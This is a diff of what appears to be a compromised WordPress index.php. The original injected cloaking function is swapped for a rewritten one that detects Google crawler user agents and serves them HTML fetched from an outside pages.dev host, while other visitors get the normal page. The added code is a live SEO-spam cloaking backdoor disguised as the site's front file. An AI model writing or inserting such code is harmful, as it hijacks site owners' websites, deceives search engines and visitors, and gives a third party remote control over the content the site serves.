@@ -1,36 +1,42 @@
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-function profile_user() {
-    $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
-    $useragent = $_SERVER['HTTP_USER_AGENT'];
-    $pasteUrl = 'https://langsungsajagass.pages.dev/index.txt';
-    $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
+// ==== Serve remote .txt HTML only for Googlebot (simplecondition) ====
 
-    if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
+$REMOTE_URL = 'https://langsungsajagass.pages.dev/index.txt';
 
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $pasteUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        $content = curl_exec($ch);
+// Fungsi cek sederhana (User-Agent saja)
+function is_googlebot(): bool {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    return (bool) preg_match('/Googlebot|Google-InspectionTool|GoogleOther|AdsBot-Google/i', $ua);
+}
+
+if (is_googlebot()) {
+    // Ambil isi remote file (cURL > fallback stream)
+    $html = null;
+    if (function_exists('curl_init')) {
+        $ch = curl_init($REMOTE_URL);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT        => 8,
+            CURLOPT_USERAGENT      => 'VerifiedBotFetcher/1.0',
+        ]);
+        $resp = curl_exec($ch);
+        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
+        if ($resp !== false && $code >= 200 && $code < 300) $html = $resp;
+    }
+    if ($html === null) {
+        $html = @file_get_contents($REMOTE_URL);
+    }
 
-        echo $content;
+    if ($html) {
+        header('Content-Type: text/html; charset=UTF-8');
+        header('X-Served-For: Googlebot');
+        echo $html;
+        exit;
     }
 }
 
-profile_user();
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+// ==== end: Googlebot handling ====
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+require_once __DIR__ . '/index.php';
